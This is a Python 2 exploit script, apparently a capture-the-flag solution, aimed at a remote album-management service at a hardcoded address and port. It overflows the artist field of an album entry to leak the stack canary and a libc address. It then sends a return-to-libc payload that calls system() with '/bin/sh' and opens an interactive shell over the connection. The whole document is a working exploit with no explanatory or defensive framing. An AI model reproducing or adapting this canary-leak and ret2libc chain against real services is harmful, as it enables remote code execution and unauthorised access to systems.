import struct
import telnetlib
import shellcodelib
import time
from socket import *

p8 = lambda x : struct.pack("<L", x)
p16 = lambda x : struct.pack("<Q", x)
up8 = lambda x : struct.unpack("<L", x)[0]
up16 = lambda x : struct.unpack("<Q", x)[0]

def ReadUntil(s, chkStr) :
    chkLen = len(chkStr)
    data = s.recv(chkLen)
    while True :
        if data[-1] == chkStr[-1] and data[-chkLen:] == chkStr:
            break
        data += s.recv(1)

    return data

HOST = "175.119.158.133"
PORT = 9091

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

baseAddr = ''
canary = ''

systemAddrDist = 0x0003b180 - 0x1873e
shellAddrDist = 0x15f61b - 0x1873e

def AddAlbum(s, name, artist):
    s.send('1\n')
    ReadUntil(s, '|')
    s.send(name + '\n')
    ReadUntil(s, '|')
    s.send(artist + '\n')

def ModifyAlbum(s, idx, name, artist):
    s.send('3\n')
    time.sleep(1)
    s.recv(10240000)
    s.send(str(idx) + '\n')
    time.sleep(1)
    s.recv(1024)
    s.send(name + '\n')
    time.sleep(1)
    s.recv(1024)
    s.send(artist + '\n')

s.recv(1024)
s.send("admin\n")
ReadUntil(s, '\n\n\n\n\n\n')

# set 100 album
for i in xrange(150):
    AddAlbum(s, 'a','b')
time.sleep(1)
s.recv(10240)

# leak canary
ModifyAlbum(s, 100, 'a', 'b' * 20)
time.sleep(1)
s.recv(1024)

s.send('2\n')
time.sleep(1)
data = s.recv(10000000)
print '[*] check canary leak\n', data[-350:-300]
print -322, ord(data[-322])
print -321, ord(data[-321])
print -320, ord(data[-320])
print -319, ord(data[-319])
print -318, ord(data[-318])
canary = '\x00' + data[-321] + data[-320] + data[-319]

# leak baseAddr
ModifyAlbum(s, 100, 'a', 'b' * 35)
time.sleep(1)
s.recv(1024)

s.send('2\n')
time.sleep(1)
data = s.recv(10000000)
print '[*] check __libc_start_main_ret leak\n', data[-350:-300]
print -324, ord(data[-324])
print -323, ord(data[-323])
print -322, ord(data[-322])
print -321, ord(data[-321])
print -320, ord(data[-320])
print -319, ord(data[-319])
baseAddr = data[-323] + data[-322]  + data[-321] + data[-320]
baseAddr = up8(baseAddr)
print hex(baseAddr)

# send payload
ModifyAlbum(s, 100, 'a', 'b' * 20 + canary + 'b'*12 + p8(baseAddr + systemAddrDist) + 'bbbb' + p8(baseAddr+shellAddrDist))

time.sleep(1)
s.recv(1024)
s.send("4\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
